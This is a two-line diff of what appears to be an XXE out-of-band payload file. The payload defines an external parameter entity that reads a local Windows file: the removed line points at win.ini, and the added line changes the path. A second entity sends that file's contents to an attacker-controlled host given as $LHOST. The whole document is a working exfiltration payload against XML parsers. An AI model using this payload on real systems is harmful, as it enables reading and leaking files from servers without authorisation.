@@ -1,2 +1,2 @@
-<!ENTITY % p1 SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % p1 SYSTEM "file:///C:/etwet/win.ini">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/X?%p1;'>"> %p2
